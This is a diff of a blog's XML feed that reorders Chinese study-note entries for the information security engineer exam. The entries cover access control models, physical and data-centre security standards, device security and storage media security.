-<li>设备实体的固件部分遭受攻击</li>
-<li>设备遭受硬件攻击</li>
-<li>设备实体的控制组件安全威胁</li>
-<li>设备非法外联</li>
-</ol>
-<h2 id="设备实体安全防护"><a href="#设备实体安全防护" class="headerlink" title="设备实体安全防护"></a>设备实体安全防护</h2><p>GB/T 21052-2007，主要技术措施：</p>
-<ol>
-<li>设备的标志和标记</li>
-<li>设备电磁辐射防护</li>
-<li>设备静电及用电安全防护</li>
-<li>设备磁场抗扰</li>
-<li>设备环境安全保护</li>
-<li>设备适应性与可靠性保护（包括：温度、湿度、冲击和碰撞适应性、可靠性、供应链弹性、安全质量保障、安全合规、安全审查）</li>
-</ol>
-<h2 id="设备硬件攻击防护"><a href="#设备硬件攻击防护" class="headerlink" title="设备硬件攻击防护"></a>设备硬件攻击防护</h2><p>主要措施：</p>
-<ol>
-<li>硬剑木马检测（方法：反向分析法、功耗分析法、侧信道分析法）</li>
-<li>硬件漏洞处理</li>
-</ol>
-<h1 id="存储介质安全分析与防护"><a href="#存储介质安全分析与防护" class="headerlink" title="存储介质安全分析与防护"></a>存储介质安全分析与防护</h1><h2 id="存储介质安全分析"><a href="#存储介质安全分析" class="headerlink" title="存储介质安全分析"></a>存储介质安全分析</h2><p>安全威胁：</p>
-<ol>
-<li>存储管理失效</li>
-<li>存储数据泄密</li>
-<li>存储介质及存储设备故障</li>
-<li>存储介质数据非安全删除</li>
-<li>恶意代码攻击</li>
-</ol>
-<h2 id="存储介质安全防护"><a href="#存储介质安全防护" class="headerlink" title="存储介质安全防护"></a>存储介质安全防护</h2><ol>
-<li>强化存储安全管理（专人负责，审批登记、备份、密封、消除数据）</li>
-<li>数据存储加密保存</li>
-<li>容错容灾存储技术（磁盘阵列、双机在线备份、离线备份）</li>
 </ol>
 ]]></content>
       <categories>
@@ -1689,6 +1523,249 @@ C^d=M mod (P)</script><p>在已知C和P的前提下，由d求M很容易，由M�
       </tags>
   </entry>
   <entry>
+    <title>第7章 访问控制技术原理与应用</title>
+    <url>/2020/09/18/%E7%AC%AC7%E7%AB%A0-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="访问控制概述"><a href="#访问控制概述" class="headerlink" title="访问控制概述"></a>访问控制概述</h1><p>访问控制是指对资源对象的访问者授权、控制的方法及运行机制。</p>
+<h2 id="访问控制目标"><a href="#访问控制目标" class="headerlink" title="访问控制目标"></a>访问控制目标</h2><ol>
+<li>防止非法用户进入系统；</li>
+<li>阻止合法用户对系统资源的非法使用，即禁止合法用户的越权访问</li>
+</ol>
+<a id="more"></a>
+<h1 id="访问控制模型"><a href="#访问控制模型" class="headerlink" title="访问控制模型"></a>访问控制模型</h1><h2 id="访问控制参考模型"><a href="#访问控制参考模型" class="headerlink" title="访问控制参考模型"></a>访问控制参考模型</h2><p>组成要素有：主体、参考监视器、客体、访问控制数据库、审计库</p>
+<p><img src="/2020/09/18/%E7%AC%AC7%E7%AB%A0-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/访问控制.jpg" alt></p>
+<h1 id="访问控制类型"><a href="#访问控制类型" class="headerlink" title="访问控制类型"></a>访问控制类型</h1><h2 id="自主访问控制"><a href="#自主访问控制" class="headerlink" title="自主访问控制"></a>自主访问控制</h2><p>客体的所有者按照自己的安全策略授予系统中的其他用户对其的访问权。</p>
+<ol>
+<li><p>基于行的自主访问控制</p>
+<p>在每个主体上附加一个该主体可访问的客体的明细表，分成三种形式：</p>
+<ul>
+<li>能力表：访问客体的钥匙，决定用户访问模式（r、w、x）。</li>
+<li>前缀表：包括保护客体名和主体对它的访问权限。检查前缀表判定访问权。</li>
+<li>口令：每个客体都有一个口令，访问前，必须向系统提供该客体的口令。</li>
+</ul>
+</li>
+<li><p>基于列的自主访问控制</p>
+<p>在每个客体上附加一个可访问它的主体的明细表。两种形式：</p>
+<ul>
+<li>保护位：对所有主体、主体组及客体拥有者指明一个访问模式集合，以比特位来表示访问权限。</li>
+<li>访问控制表：在每个客体附加一个主体明细表，表示访问控制矩阵。每一项包括主体的身份和主体对该客体的访问权限。</li>
+</ul>
+</li>
+</ol>
+<p>好处：用户根据其安全需求，自行设置访问控制权限，访问机制简单、灵活</p>
+<p>缺点：依赖于用户的安全意识和技能，不能满足高安全等级的安全要求</p>
+<h2 id="强制访问控制"><a href="#强制访问控制" class="headerlink" title="强制访问控制"></a>强制访问控制</h2><p>根据主体和客体的安全属性，以强制方式控制主体对客体的访问。</p>
+<h2 id="基于角色的访问控制"><a href="#基于角色的访问控制" class="headerlink" title="基于角色的访问控制"></a>基于角色的访问控制</h2><p>RBRC：根据完成某些职责任务所需要点访问权限来进行授权和管理，由用户（U）、角色（R）、会话（S）和权限（P）四个基本要素组成。</p>
+<h2 id="基于属性点访问控制"><a href="#基于属性点访问控制" class="headerlink" title="基于属性点访问控制"></a>基于属性点访问控制</h2><p>ABAC：根据主体的属性、客体的属性、环境的条件以及访问策略对主体的请求操作进行授权许可或拒绝</p>
+<h1 id="访问控制策略设计与实现"><a href="#访问控制策略设计与实现" class="headerlink" title="访问控制策略设计与实现"></a>访问控制策略设计与实现</h1><h2 id="访问控制策略"><a href="#访问控制策略" class="headerlink" title="访问控制策略"></a>访问控制策略</h2><p>规定访问资源的权限，防止资源损失，泄漏或非法使用。</p>
+<p>设计要求：网络应用安全需求（内外部访问）、相关信息（端口）、传播和授权（分级分类）、一致性、法规和合同义务、访问权限的更新维护</p>
+<p>说明规则时：以“未经明确允许的都是禁止的”为前提、信息标记的变化、用户许可的变化、颁布之前的批准与许可</p>
+<p>组成：所要控制的对象、访问控制规则、用户权限或其他访问安全要求</p>
+<h2 id="访问控制规则"><a href="#访问控制规则" class="headerlink" title="访问控制规则"></a>访问控制规则</h2><ul>
+<li>基于用户身份的访问控制规则</li>
+<li>基于角色的访问控制规则</li>
+<li>基于地址的访问控制规则</li>
+<li>基于时间的访问控制规则</li>
+<li>基于异常事件的访问控制规则</li>
+<li>基于服务数量的访问控制规则</li>
+</ul>
+<h1 id="访问控制过程与安全管理"><a href="#访问控制过程与安全管理" class="headerlink" title="访问控制过程与安全管理"></a>访问控制过程与安全管理</h1><h2 id="访问控制过程"><a href="#访问控制过程" class="headerlink" title="访问控制过程"></a>访问控制过程</h2><ol>
+<li>明确访问控制管理的资产</li>
+<li>分析管理资产的安全需求</li>
+<li>制定访问控制策略，确定访问控制规则以及用户权限分配</li>
+<li>实现访问控制策略，建立用户访问身份认证系统，根据用户类型授权访问资产</li>
+<li>运行和维护访问控制系统，及时调整访问策略</li>
+</ol>
+<h2 id="最小特权管理"><a href="#最小特权管理" class="headerlink" title="最小特权管理"></a>最小特权管理</h2><p>系统中每一个主体只能拥有完成任务所必要的权限集</p>
+<h2 id="用户访问管理"><a href="#用户访问管理" class="headerlink" title="用户访问管理"></a>用户访问管理</h2><p><img src="/2020/09/18/%E7%AC%AC7%E7%AB%A0-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/用户管理.jpg" style="zoom:50%;"></p>
+<h2 id="口令安全管理"><a href="#口令安全管理" class="headerlink" title="口令安全管理"></a>口令安全管理</h2><h1 id="访问控制主要产品与技术指标"><a href="#访问控制主要产品与技术指标" class="headerlink" title="访问控制主要产品与技术指标"></a>访问控制主要产品与技术指标</h1><h2 id="访问控制组要产品"><a href="#访问控制组要产品" class="headerlink" title="访问控制组要产品"></a>访问控制组要产品</h2><ol>
+<li>4A系统：认证（Authentication）、授权（Authorization）、账号（Account）、审计（Audit）</li>
+<li>安全网关：防火墙、统一威胁管理（UTM）</li>
+<li>系统安全增强</li>
+</ol>
+<h2 id="访问控制主要技术指标"><a href="#访问控制主要技术指标" class="headerlink" title="访问控制主要技术指标"></a>访问控制主要技术指标</h2><ul>
+<li>产品支持访问控制策略规则类型</li>
+<li>产品支持访问控制规则最大数量</li>
+<li>产品访问控制规则检查速度</li>
+<li>产品滋生安全和质量保障级别</li>
+</ul>
+<h1 id="访问控制技术应用"><a href="#访问控制技术应用" class="headerlink" title="访问控制技术应用"></a>访问控制技术应用</h1><p>应用场景类型：物理访问控制、网络访问控制、操作系统访问控制、数据库/数据访问控制、应用系统访问控制</p>
+<p>示例：</p>
+<p>UNIX/Linux系统访问控制、Windows访问控制、IIS FTP访问控制、网络访问控制、Web服务访问控制、基于角色管理的系统访问控制、网络安全等级保护访问控制设计等应用参考详见P151-P158</p>
+]]></content>
+      <categories>
+        <category>信息安全工程师软考</category>
+      </categories>
+      <tags>
+        <tag>学习笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第5章 物理环境安全技术</title>
+    <url>/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/</url>
+    <content><![CDATA[<h1 id="物理安全概念与要求"><a href="#物理安全概念与要求" class="headerlink" title="物理安全概念与要求"></a>物理安全概念与要求</h1><h2 id="物理安全威胁"><a href="#物理安全威胁" class="headerlink" title="物理安全威胁"></a>物理安全威胁</h2><p>常见威胁：</p>
+<p><img src="/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/物理安全威胁.jpg" alt></p>
+<a id="more"></a>
+<p>攻击技术：硬件木马、硬件协同的恶意代码、硬件安全漏洞利用、基于软件漏洞攻击硬件实体、基于环境攻击计算机实体。</p>
+<h2 id="物理安全保护"><a href="#物理安全保护" class="headerlink" title="物理安全保护"></a>物理安全保护</h2><ol>
+<li>设备物理安全：有标志和标记、防止电磁信息泄露、抗电磁干扰、安全漏洞等</li>
+<li>环境物理安全：机房选择、防护</li>
+<li>系统物理安全：存储介质，灾备、访问保护</li>
+</ol>
+<p>方法：安全合规、访问控制、安全屏蔽、故障容错、安全监测与预警、供应链安全管理和容灾备份等。</p>
+<h2 id="物理安全规范"><a href="#物理安全规范" class="headerlink" title="物理安全规范"></a>物理安全规范</h2><p>《信息系统物理安全技术要求（GB/T 21052-2007）》分4级保护：</p>
+<ol>
+<li>第一级用户自主保护级提供基本的物理安全保护</li>
+<li>第二级系统审计保护级提供适当的物理安全保护</li>
+<li>第三级安全标记保护级提供较高程度的物理安全保护</li>
+<li>第四级结构化保护级提供更高程度的物理安全保护</li>
+</ol>
+<h1 id="物理环境安全分析与防护"><a href="#物理环境安全分析与防护" class="headerlink" title="物理环境安全分析与防护"></a>物理环境安全分析与防护</h1><ol>
+<li><p><strong> 防火</strong></p>
+<p>理想灭火材料：卤代烷1211和1301灭火剂</p>
+</li>
+<li><p><strong>防水</strong></p>
+<p>不要把机房设置在楼房底层或地下室</p>
+</li>
+<li><p><strong>防震</strong></p>
+</li>
+<li><p><strong>防盗</strong></p>
+<p>报警器和监控、物理访问控制</p>
+</li>
+<li><p><strong>防鼠虫害</strong></p>
+<p>危害：咬坏电缆或引起电源短路</p>
+</li>
+<li><p><strong>防雷</strong></p>
+<p>避雷针及专用防雷设施，设备接地</p>
+</li>
+<li><p><strong>防电磁</strong></p>
+<p>防止电磁干扰，防止信息通过电磁泄漏。措施：接地、屏蔽、选择合适场地</p>
+</li>
+<li><p><strong>防静电</strong></p>
+<p>人员服装、机房温湿度、材料、操作戴防静电手套</p>
+</li>
+<li><p><strong>安全供电</strong></p>
+<p>专用电线路、不间断电源（UPS）、备用发电机</p>
+</li>
+</ol>
+<h1 id="机房安全分析与防护"><a href="#机房安全分析与防护" class="headerlink" title="机房安全分析与防护"></a>机房安全分析与防护</h1><h2 id="机房功能区域组成"><a href="#机房功能区域组成" class="headerlink" title="机房功能区域组成"></a>机房功能区域组成</h2><p>《计算机场地通用规范（GB/T 2887-2011）》（允许一室多用或酌情增减）：</p>
+<ol>
+<li>主要工作房间：主机房、终端室等；</li>
+<li>第一类辅助房间：低压配电间、不间断电源室、空调机室、发电机室、气体钢瓶室、监控室等</li>
+<li>第二类辅助房间：资料室、维修室、技术人员办公室</li>
+<li>第三类辅助房间：储藏室、缓冲间、技术人员休息室、盥洗室</li>
+</ol>
+<h2 id="机房安全等级划分"><a href="#机房安全等级划分" class="headerlink" title="机房安全等级划分"></a>机房安全等级划分</h2><p>《计算机场地通用规范（GB/T 2887-2011）》分为A、B、C三级：</p>
+<ul>
+<li>A：计算机系统运行中断后，会对国家安全、社会秩序、公共利益造成严重损害</li>
+<li>B：计算机系统运行中断后，会对国家安全、社会秩序、公共利益造成较大损害的</li>
+<li>C：不属于A、B级的情况</li>
+</ul>
+<p>安全级别要求：</p>
+<p><img src="/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/安全级别要求-1.jpg" alt></p>
+<p><img src="/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/安全级别要求-2.jpg" alt></p>
+<h2 id="机房场地选择要求"><a href="#机房场地选择要求" class="headerlink" title="机房场地选择要求"></a>机房场地选择要求</h2><ol>
+<li><p>环境安全性</p>
+<p>避开：危险来源区、环境污染区、盐雾区、落雷区</p>
+</li>
+<li><p>地质可靠性</p>
+<p>避开：杂填土、地层断裂、地质不牢靠、有开采价值矿区、低洼、潮湿</p>
+</li>
+<li><p>场地抗电磁干扰性</p>
+<p>避开：无线电干扰源和微波线路的强电磁场干扰场所（不大于800A/m，100e）、强电流冲击</p>
+</li>
+<li><p>应避开强振动源和强噪音源</p>
+<p>避开：振动源、机场、主要道路</p>
+</li>
+<li><p>应避免设在建筑物的高层以及用水设备的下层或隔壁</p>
+</li>
+</ol>
+<h2 id="数据中心建设与设计要求"><a href="#数据中心建设与设计要求" class="headerlink" title="数据中心建设与设计要求"></a>数据中心建设与设计要求</h2><ul>
+<li>超大型数据中心：&gt;=10000个标准机架；重点考虑气候环境、能源供给，优先在气候寒冷、能源充足的一类或气候适宜，能源充足的二类地区。</li>
+<li>大型数据中心：&gt;=3000，&lt;10000标准机架；重点考虑气候环境、能源供给，优先在一类二类地区，也可在气候适宜，靠近能源富集地的三类地区</li>
+<li>中小型数据中心：&lt;3000标准机架；重点考虑市场需求、能源供给，在靠近用户所在地、能源获取便利的地区建设。</li>
+</ul>
+<p>《设计规范》（2018.1.1）将数据中心分为A、B、C三级，强制性条文简述：</p>
+<ul>
+<li>所有设备的金属外壳、各类金属管道、金属线槽、建筑物金属结构必须进行等电位联结并接地（8.4.4）</li>
+<li>耐火等级不应低于二级（13.2.1）</li>
+<li>与气体供能用房在统一建筑内时，两者之间采用耐火极限不低于2.0h的防火隔墙和1.5h的楼板，隔墙上开门采用甲级防火门（13.2.4）</li>
+<li>采用管网式气体或细水雾灭火系统的主机房，应同时设置两组独立的火灾探测器，火灾报警系统英语灭火系统和视频监控系统联动（13.3.1）</li>
+<li>设置气体灭火系统的主机房，应配置专用空气呼吸器或氧气呼吸器（13.4.1）</li>
+</ul>
+<h2 id="互联网数据中心"><a href="#互联网数据中心" class="headerlink" title="互联网数据中心"></a>互联网数据中心</h2><p>IDC六大逻辑组成部分：</p>
+<p><img src="/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/IDC逻辑组成.jpg" alt></p>
+<p>《互联网数据中心工程技术规范（GB 51195-2016）》（2017.4.1）划分为R1（可用性不小于99.5%），R2（不小于99.9%），R3（不小于99.99%）3个级别，强制性条文简述：</p>
+<ul>
+<li>抗震设防烈度7度以上（含7度）地区，主要电信设备必须经过性能检测合格</li>
+<li>对肌肤安全条件进行全面检查：灭火器材，非燃材料，不同电压的电源设备、电源插座应有明显区别标志。</li>
+</ul>
+<h2 id="CA机房物理安全控制"><a href="#CA机房物理安全控制" class="headerlink" title="CA机房物理安全控制"></a>CA机房物理安全控制</h2><p>《电子政务电子认证服务业务规则规范》，提出规范性要求。</p>
+<ol>
+<li>物理环境按照GM/T 0034要求严格实施，至少每五年进行一次屏蔽室检测</li>
+<li>所有人员应佩戴标识身份的证明</li>
+<li>进出人员留有记录，并妥善、安全的保管。（监控录像、门禁记录）</li>
+<li>建立并执行人员访问制度及程序，对访问人员进行监督和监控</li>
+<li>保护设备免于电源故障或网络通信异常影响</li>
+<li>处理或再利用存储介质，检查是否含有敏感数据，并物理销毁或安全覆盖</li>
+<li>制定相关安全检查、监督策略。</li>
+</ol>
+<h1 id="网络通信线路安全分析与防护"><a href="#网络通信线路安全分析与防护" class="headerlink" title="网络通信线路安全分析与防护"></a>网络通信线路安全分析与防护</h1><h2 id="网络通信线路安全分析"><a href="#网络通信线路安全分析" class="headerlink" title="网络通信线路安全分析"></a>网络通信线路安全分析</h2><p>威胁：</p>
+<ul>
+<li>网络通信线路被切断</li>
+<li>网络通信线路被电磁干扰</li>
+<li>网络通信线路泄漏信息</li>
+</ul>
+<h2 id="网络通信线路安全防护"><a href="#网络通信线路安全防护" class="headerlink" title="网络通信线路安全防护"></a>网络通信线路安全防护</h2><p>两个方面：</p>
+<ul>
+<li>网络通信设备：采取设备冗余</li>
+<li>网络通信线路：采取多路通信</li>
+</ul>
+<h1 id="设备安全分析与防护"><a href="#设备安全分析与防护" class="headerlink" title="设备安全分析与防护"></a>设备安全分析与防护</h1><h2 id="设备实体安全分析"><a href="#设备实体安全分析" class="headerlink" title="设备实体安全分析"></a>设备实体安全分析</h2><ol>
+<li>设备实体环境关联安全威胁</li>
+<li>设备实体被盗取或损害</li>
+<li>设备实体受到电磁干扰</li>
+<li>设备供应链条中断或延缓</li>
+<li>设备实体的固件部分遭受攻击</li>
+<li>设备遭受硬件攻击</li>
+<li>设备实体的控制组件安全威胁</li>
+<li>设备非法外联</li>
+</ol>
+<h2 id="设备实体安全防护"><a href="#设备实体安全防护" class="headerlink" title="设备实体安全防护"></a>设备实体安全防护</h2><p>GB/T 21052-2007，主要技术措施：</p>
+<ol>
+<li>设备的标志和标记</li>
+<li>设备电磁辐射防护</li>
+<li>设备静电及用电安全防护</li>
+<li>设备磁场抗扰</li>
+<li>设备环境安全保护</li>
+<li>设备适应性与可靠性保护（包括：温度、湿度、冲击和碰撞适应性、可靠性、供应链弹性、安全质量保障、安全合规、安全审查）</li>
+</ol>
+<h2 id="设备硬件攻击防护"><a href="#设备硬件攻击防护" class="headerlink" title="设备硬件攻击防护"></a>设备硬件攻击防护</h2><p>主要措施：</p>
+<ol>
+<li>硬剑木马检测（方法：反向分析法、功耗分析法、侧信道分析法）</li>
+<li>硬件漏洞处理</li>
+</ol>
+<h1 id="存储介质安全分析与防护"><a href="#存储介质安全分析与防护" class="headerlink" title="存储介质安全分析与防护"></a>存储介质安全分析与防护</h1><h2 id="存储介质安全分析"><a href="#存储介质安全分析" class="headerlink" title="存储介质安全分析"></a>存储介质安全分析</h2><p>安全威胁：</p>
+<ol>
+<li>存储管理失效</li>
+<li>存储数据泄密</li>
+<li>存储介质及存储设备故障</li>
+<li>存储介质数据非安全删除</li>
+<li>恶意代码攻击</li>
+</ol>
+<h2 id="存储介质安全防护"><a href="#存储介质安全防护" class="headerlink" title="存储介质安全防护"></a>存储介质安全防护</h2><ol>
+<li>强化存储安全管理（专人负责，审批登记、备份、密封、消除数据）</li>
+<li>数据存储加密保存</li>
+<li>容错容灾存储技术（磁盘阵列、双机在线备份、离线备份）</li>
+</ol>
+]]></content>
+      <categories>
+        <category>信息安全工程师软考</category>
+      </categories>
+      <tags>
+        <tag>学习笔记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>第6章 认证技术原理应用</title>
     <url>/2020/09/17/%E7%AC%AC6%E7%AB%A0-%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%BA%94%E7%94%A8/</url>
     <content><![CDATA[<h1 id="认证概述"><a href="#认证概述" class="headerlink" title="认证概述"></a>认证概述</h1><p>认证由标识和鉴别两部分组成。</p>
@@ -1771,83 +1848,6 @@ C^d=M mod (P)</script><p>在已知C和P的前提下，由d求M很容易，由M�
 <p>技术指标：密码算法支持、认证准确性、用户支持数量、安全保障级别</p>
 <h1 id="认证技术应用"><a href="#认证技术应用" class="headerlink" title="认证技术应用"></a>认证技术应用</h1><p>常见应用场景：用户身份验证、信息来源证实、信息安全保护</p>
 <p>校园网、网络路由、机房门禁、公民网络电子身份标识、HTTP等方面认证技术应用参考详见P134-139</p>
-]]></content>
-      <categories>
-        <category>信息安全工程师软考</category>
-      </categories>
-      <tags>
-        <tag>学习笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>第7章 访问控制技术原理与应用</title>
-    <url>/2020/09/18/%E7%AC%AC7%E7%AB%A0-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/</url>
-    <content><![CDATA[<h1 id="访问控制概述"><a href="#访问控制概述" class="headerlink" title="访问控制概述"></a>访问控制概述</h1><p>访问控制是指对资源对象的访问者授权、控制的方法及运行机制。</p>
-<h2 id="访问控制目标"><a href="#访问控制目标" class="headerlink" title="访问控制目标"></a>访问控制目标</h2><ol>
-<li>防止非法用户进入系统；</li>
-<li>阻止合法用户对系统资源的非法使用，即禁止合法用户的越权访问</li>
-</ol>
-<a id="more"></a>
-<h1 id="访问控制模型"><a href="#访问控制模型" class="headerlink" title="访问控制模型"></a>访问控制模型</h1><h2 id="访问控制参考模型"><a href="#访问控制参考模型" class="headerlink" title="访问控制参考模型"></a>访问控制参考模型</h2><p>组成要素有：主体、参考监视器、客体、访问控制数据库、审计库</p>
-<p><img src="/2020/09/18/%E7%AC%AC7%E7%AB%A0-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/访问控制.jpg" alt></p>
-<h1 id="访问控制类型"><a href="#访问控制类型" class="headerlink" title="访问控制类型"></a>访问控制类型</h1><h2 id="自主访问控制"><a href="#自主访问控制" class="headerlink" title="自主访问控制"></a>自主访问控制</h2><p>客体的所有者按照自己的安全策略授予系统中的其他用户对其的访问权。</p>
-<ol>
-<li><p>基于行的自主访问控制</p>
-<p>在每个主体上附加一个该主体可访问的客体的明细表，分成三种形式：</p>
-<ul>
-<li>能力表：访问客体的钥匙，决定用户访问模式（r、w、x）。</li>
-<li>前缀表：包括保护客体名和主体对它的访问权限。检查前缀表判定访问权。</li>
-<li>口令：每个客体都有一个口令，访问前，必须向系统提供该客体的口令。</li>
-</ul>
-</li>
-<li><p>基于列的自主访问控制</p>
-<p>在每个客体上附加一个可访问它的主体的明细表。两种形式：</p>
-<ul>
-<li>保护位：对所有主体、主体组及客体拥有者指明一个访问模式集合，以比特位来表示访问权限。</li>
-<li>访问控制表：在每个客体附加一个主体明细表，表示访问控制矩阵。每一项包括主体的身份和主体对该客体的访问权限。</li>
-</ul>
-</li>
-</ol>
-<p>好处：用户根据其安全需求，自行设置访问控制权限，访问机制简单、灵活</p>
-<p>缺点：依赖于用户的安全意识和技能，不能满足高安全等级的安全要求</p>
-<h2 id="强制访问控制"><a href="#强制访问控制" class="headerlink" title="强制访问控制"></a>强制访问控制</h2><p>根据主体和客体的安全属性，以强制方式控制主体对客体的访问。</p>
-<h2 id="基于角色的访问控制"><a href="#基于角色的访问控制" class="headerlink" title="基于角色的访问控制"></a>基于角色的访问控制</h2><p>RBRC：根据完成某些职责任务所需要点访问权限来进行授权和管理，由用户（U）、角色（R）、会话（S）和权限（P）四个基本要素组成。</p>
-<h2 id="基于属性点访问控制"><a href="#基于属性点访问控制" class="headerlink" title="基于属性点访问控制"></a>基于属性点访问控制</h2><p>ABAC：根据主体的属性、客体的属性、环境的条件以及访问策略对主体的请求操作进行授权许可或拒绝</p>
-<h1 id="访问控制策略设计与实现"><a href="#访问控制策略设计与实现" class="headerlink" title="访问控制策略设计与实现"></a>访问控制策略设计与实现</h1><h2 id="访问控制策略"><a href="#访问控制策略" class="headerlink" title="访问控制策略"></a>访问控制策略</h2><p>规定访问资源的权限，防止资源损失，泄漏或非法使用。</p>
-<p>设计要求：网络应用安全需求（内外部访问）、相关信息（端口）、传播和授权（分级分类）、一致性、法规和合同义务、访问权限的更新维护</p>
-<p>说明规则时：以“未经明确允许的都是禁止的”为前提、信息标记的变化、用户许可的变化、颁布之前的批准与许可</p>
-<p>组成：所要控制的对象、访问控制规则、用户权限或其他访问安全要求</p>
-<h2 id="访问控制规则"><a href="#访问控制规则" class="headerlink" title="访问控制规则"></a>访问控制规则</h2><ul>
-<li>基于用户身份的访问控制规则</li>
-<li>基于角色的访问控制规则</li>
-<li>基于地址的访问控制规则</li>
-<li>基于时间的访问控制规则</li>
-<li>基于异常事件的访问控制规则</li>
-<li>基于服务数量的访问控制规则</li>
-</ul>
-<h1 id="访问控制过程与安全管理"><a href="#访问控制过程与安全管理" class="headerlink" title="访问控制过程与安全管理"></a>访问控制过程与安全管理</h1><h2 id="访问控制过程"><a href="#访问控制过程" class="headerlink" title="访问控制过程"></a>访问控制过程</h2><ol>
-<li>明确访问控制管理的资产</li>
-<li>分析管理资产的安全需求</li>
-<li>制定访问控制策略，确定访问控制规则以及用户权限分配</li>
-<li>实现访问控制策略，建立用户访问身份认证系统，根据用户类型授权访问资产</li>
-<li>运行和维护访问控制系统，及时调整访问策略</li>
-</ol>
-<h2 id="最小特权管理"><a href="#最小特权管理" class="headerlink" title="最小特权管理"></a>最小特权管理</h2><p>系统中每一个主体只能拥有完成任务所必要的权限集</p>
-<h2 id="用户访问管理"><a href="#用户访问管理" class="headerlink" title="用户访问管理"></a>用户访问管理</h2><p><img src="/2020/09/18/%E7%AC%AC7%E7%AB%A0-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/用户管理.jpg" style="zoom:50%;"></p>
-<h2 id="口令安全管理"><a href="#口令安全管理" class="headerlink" title="口令安全管理"></a>口令安全管理</h2><h1 id="访问控制主要产品与技术指标"><a href="#访问控制主要产品与技术指标" class="headerlink" title="访问控制主要产品与技术指标"></a>访问控制主要产品与技术指标</h1><h2 id="访问控制组要产品"><a href="#访问控制组要产品" class="headerlink" title="访问控制组要产品"></a>访问控制组要产品</h2><ol>
-<li>4A系统：认证（Authentication）、授权（Authorization）、账号（Account）、审计（Audit）</li>
-<li>安全网关：防火墙、统一威胁管理（UTM）</li>
-<li>系统安全增强</li>
-</ol>
-<h2 id="访问控制主要技术指标"><a href="#访问控制主要技术指标" class="headerlink" title="访问控制主要技术指标"></a>访问控制主要技术指标</h2><ul>
-<li>产品支持访问控制策略规则类型</li>
-<li>产品支持访问控制规则最大数量</li>
-<li>产品访问控制规则检查速度</li>
-<li>产品滋生安全和质量保障级别</li>
-</ul>
-<h1 id="访问控制技术应用"><a href="#访问控制技术应用" class="headerlink" title="访问控制技术应用"></a>访问控制技术应用</h1><p>应用场景类型：物理访问控制、网络访问控制、操作系统访问控制、数据库/数据访问控制、应用系统访问控制</p>
-<p>示例：</p>
-<p>UNIX/Linux系统访问控制、Windows访问控制、IIS FTP访问控制、网络访问控制、Web服务访问控制、基于角色管理的系统访问控制、网络安全等级保护访问控制设计等应用参考详见P151-P158</p>
 ]]></content>
       <categories>
         <category>信息安全工程师软考</category>
